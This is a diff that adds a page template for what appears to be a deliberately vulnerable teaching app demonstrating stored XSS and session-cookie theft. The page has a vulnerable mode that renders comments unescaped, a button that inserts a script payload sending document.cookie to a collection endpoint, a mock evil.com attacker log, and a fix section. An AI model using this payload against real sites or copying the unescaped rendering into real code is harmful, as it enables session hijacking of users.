@@ -1,0 +1,72 @@
+{% extends "base.html" %}
+{% block title %}Stored XSS{% endblock %}
+{% block content %}
+  <h1>Stored XSS → Cookie Theft</h1>
+  <div class="sub">Section 3 · script injection &amp; session hijacking</div>
+  {% include "_toggle.html" %}
+
+  <h2>// what is it?</h2>
+  <div class="explain">
+    A comment is stored and later shown to other users. If the app renders it as <b>raw HTML</b>,
+    an attacker's <code>&lt;script&gt;</code> runs in every visitor's browser — and can steal their
+    session cookie.
+  </div>
+
+  <h2>// try it</h2>
+  <div class="panel">
+    <form method="POST" action="/xss?mode={{ mode }}" class="stack">
+      <input type="hidden" name="mode" value="{{ mode }}">
+      <input name="author" placeholder="name" value="mallory" style="max-width:200px">
+      <textarea name="body" id="c" placeholder="comment"></textarea>
+      <div class="row">
+        <button type="submit">&gt; post_comment</button>
+        <button type="button" class="btn ghost" onclick="fill()">insert cookie-stealing payload</button>
+        <a class="btn danger" href="/xss/reset?mode={{ mode }}">reset</a>
+      </div>
+    </form>
+
+    <h2>// comments</h2>
+    {% for c in comments %}
+      <div class="comment"><span class="who">{{ c['author'] }}</span><span class="t">{{ c['created'] }}</span>
+        <div class="b">{% if mode == 'secure' %}{{ c['body'] }}{% else %}{{ c['body']|safe }}{% endif %}</div>
+      </div>
+    {% else %}
+      <div class="sub">No comments yet.</div>
+    {% endfor %}
+
+    <div class="attacker">
+      <div class="cap">🕵️ ATTACKER SERVER LOG (evil.com)</div>
+      <div class="loot" id="loot">{{ loot and ('attacker received → ' + loot) or 'waiting for a victim to load a page with the payload…' }}</div>
+    </div>
+  </div>
+
+  <h2>// under the hood</h2>
+  <div class="reveal">
+  {% if mode == 'vuln' %}
+    <pre><code>{% raw %}{{ comment.body|safe }}{% endraw %}   # raw render — the &lt;script&gt; executes
+Set-Cookie: vl_demo_session=…            # no HttpOnly → document.cookie can read it</code></pre>
+    <div class="sub">The payload reads <code>document.cookie</code> and beacons it to the attacker's server.</div>
+  {% else %}
+    <pre><code>{% raw %}{{ comment.body }}{% endraw %}        # auto-escaped — the script shows as text
+Set-Cookie: vl_demo_session=…; HttpOnly  # JavaScript cannot read it</code></pre>
+  {% endif %}
+  </div>
+
+  <h2>// the fix</h2>
+  <div class="fix">Escape everything you render (most engines do by default — don't disable it), add a <b>Content-Security-Policy</b>, and set <b>HttpOnly</b> on session cookies so JavaScript can't read them.</div>
+
+  <script>
+    function fill(){
+      document.getElementById('c').value =
+        '<scr'+'ipt>new Image().src="/xss/collect?c="+encodeURIComponent(document.cookie)</scr'+'ipt>';
+    }
+    async function poll(){
+      try{
+        const r = await fetch('/xss/loot');
+        const j = await r.json();
+        if(j.captured){ document.getElementById('loot').textContent = 'attacker received → ' + j.captured; }
+      }catch(e){}
+    }
+    setInterval(poll, 1500); poll();
+  </script>
+{% endblock %}
